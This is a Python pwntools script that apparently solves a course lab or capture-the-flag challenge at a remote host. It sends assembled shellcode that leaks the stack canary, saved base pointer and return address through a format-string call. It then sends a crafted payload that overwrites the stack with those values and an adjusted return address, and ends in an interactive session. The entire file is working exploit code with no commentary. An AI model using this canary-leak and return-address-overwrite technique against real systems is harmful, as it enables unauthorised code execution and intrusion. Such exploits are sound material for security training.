#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

my_asm="""
push rbp
mov rbp, rsp
sub rsp, 0x40
mov qword [rbp-0x38], rdi
mov r8, qword [rbp-0x38]

mov rdx, qword ptr[rbp]
mov rsi, qword ptr[rdx-0x8]
mov rcx, qword ptr[rbp+0x8]

movabs rdi, 0x20786c2520786c25
mov qword[rbp-0x28], rdi
xor rdi, rdi
mov edi, 0x20786c25
mov qword[rbp-0x20], edi

lea rdi, qword[rbp-0x28]
call r8
    """
machine_code = asm(my_asm)
r.sendlineafter(b'send to me? ', str(len(machine_code)).encode())
r.sendlineafter(b'to call? ', '0')    

r.sendafter(b'bytes): ', machine_code)

# print(r.recvuntil('\n', drop=True))
canary = int(r.recvuntil(' ', drop=True), 16)
rbp = int(r.recvuntil(' ', drop=True), 16)
ra = int(r.recvuntil(' ', drop=True), 16) + 171
ans = b'0000' + p64(0) + p32(0)
ans += p64(0)
ans += p64(canary) + p64(rbp) + p64(ra)
for i in range(10): ans += p32(0)
r.sendafter(b'Show me your answer? ', ans)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :